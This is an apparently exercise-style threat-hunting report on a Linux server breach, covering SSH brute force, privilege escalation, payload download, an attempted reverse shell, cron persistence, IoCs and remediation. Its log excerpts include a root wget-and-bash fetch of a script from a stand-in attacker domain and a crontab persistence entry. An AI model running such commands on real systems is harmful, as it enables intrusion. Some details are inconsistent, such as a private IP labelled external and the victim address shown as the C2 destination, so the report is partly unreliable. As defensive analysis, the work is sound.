# Executive Threat Hunting Investigation Report

**Document Classification:** CONFIDENTIAL // INTERNAL USE ONLY
**Date of Investigation:** June 23, 2026
**Prepared By:** Senior Threat Hunter (Intern Candidate)
**Target Environment:** Production Linux Infrastructure (Ubuntu Server)
**Reference:** INC-2026-06-23-001

---

## 1. Executive Summary
During a proactive threat hunting operation aligned with the **MITRE ATT&CK Framework**, our Security Operations Center (SOC) identified a successful breach of a critical Linux server infrastructure. The threat actor, operating from the external IP `192.168.1.100`, successfully bypassed perimeter defenses, executed a brute-force attack to compromise valid credentials, escalated privileges, and established persistent Command and Control (C2) mechanisms. 

This report details the complete attack lifecycle, technical evidence collected, and strategic remediation steps required to secure the enterprise environment against this advanced persistent threat (APT) behavior.

## 2. Scope and Objectives
- **Objective:** To conduct a proactive, intelligence-driven threat hunt utilizing system logs to detect anomalous behaviors, undocumented persistence mechanisms, and unauthorized lateral movement.
- **Scope:** Syslog, authentication logs (auth.log), firewall logs (iptables), and process execution telemetry.

## 3. Incident Timeline & Technical Analysis

The attacker executed a highly coordinated attack sequence spanning approximately three minutes.

| Timestamp (UTC) | Phase | Technical Description | Evidence/Log Snippet |
| :--- | :--- | :--- | :--- |
| **10:23:45 - 10:23:51** | **Initial Access Attempt** | The adversary initiated an automated SSH brute-force attack targeting the `root` account. | `sshd[4010]: Failed password for root from 192.168.1.100...` |
| **10:24:12** | **Initial Access Success** | The adversary successfully authenticated using compromised credentials for the `admin` account. | `sshd[4030]: Accepted password for admin from 192.168.1.100` |
| **10:25:01** | **Privilege Escalation & Tool Transfer** | Operating as `admin`, the attacker utilized `sudo` to bypass restrictions and downloaded a malicious payload (`payload.sh`) from an external staging server via `wget`. | `COMMAND=/usr/bin/wget http://malicious-server.xyz/payload.sh` |
| **10:25:15** | **Execution** | The downloaded payload was executed with elevated (`root`) privileges using the bash interpreter. | `COMMAND=/bin/bash /tmp/payload.sh` |
| **10:25:30** | **Command and Control (C2)** | A reverse shell connection was attempted to the attacker's infrastructure over TCP port 4444 (default Metasploit/Netcat port), which was successfully dropped by iptables. | `kernel: iptables: DROP... DST=10.0.0.5... DPT=4444` |
| **10:26:00** | **Persistence** | The attacker modified the system crontab to execute the malicious payload periodically, ensuring survival across reboots. | `crond[4105]: (root) CMD (/tmp/payload.sh >/dev/null 2>&1)` |

## 4. Threat Intelligence & Indicators of Compromise (IoCs)

To facilitate immediate containment across the enterprise, the following IoCs have been extracted and should be ingested into all EDR, SIEM, and Firewall solutions:

*   **IPv4 Addresses:**
    *   `192.168.1.100` (Attacker Source IP)
    *   `10.0.0.5` (Targeted Internal Asset)
*   **Domains/URLs:**
    *   `http://malicious-server.xyz` (Payload Delivery Network)
*   **File Artifacts:**
    *   `/tmp/payload.sh` (Malicious Bash Script)
*   **Behavioral Anomalies:**
    *   `wget` execution originating from an interactive SSH session.
    *   Outbound traffic attempting to connect over non-standard HTTP/HTTPS ports (TCP 4444).

## 5. Risk Assessment & Business Impact
*   **Severity Rating: CRITICAL**
*   **Impact:** The attacker successfully achieved `root` level privileges. While the immediate C2 connection was intercepted by firewall rules, the established persistence mechanism via `crontab` means the system remains compromised. If left unmitigated, this access could lead to lateral movement, data exfiltration, or the deployment of ransomware, resulting in severe financial and reputational damage.

## 6. Strategic & Tactical Remediation

### Phase 1: Immediate Containment (0-24 Hours)
1.  **Network Isolation:** Immediately isolate the compromised server (`10.0.0.5`) from the corporate network and the internet to prevent data exfiltration.
2.  **Account Revocation:** Forcefully terminate all active SSH sessions and reset passwords for all accounts, specifically the compromised `admin` and `root` accounts.
3.  **IoC Blocking:** Blacklist `192.168.1.100` and `malicious-server.xyz` at the perimeter edge (Firewalls/Web Proxies).

### Phase 2: Eradication & Recovery (24-72 Hours)
1.  **Artifact Removal:** Remove the malicious payload (`/tmp/payload.sh`) and delete the unauthorized cron job entries.
2.  **Forensic Image:** Before wiping the system, capture a memory and disk image for deeper forensic analysis.
3.  **System Rebuild:** Due to the root-level compromise, the server must be rebuilt from a known good baseline image.

### Phase 3: Strategic Hardening (Long-Term)
1.  **Implement Multi-Factor Authentication (MFA):** Mandate MFA/2FA for all SSH and remote access portals to neutralize credential compromise.
2.  **Disable Root SSH Login:** Modify `/etc/ssh/sshd_config` to explicitly set `PermitRootLogin no`.
3.  **Deploy Endpoint Detection and Response (EDR):** Roll out advanced EDR agents to all critical infrastructure to detect abnormal process trees (e.g., `bash` spawning from `wget`).
4.  **Implement Rate Limiting:** Utilize `fail2ban` or similar mechanisms to automatically block IPs exhibiting brute-force behavior.

---
**Sign-off:**
*Threat Hunting Division, Cyber Defense Team*
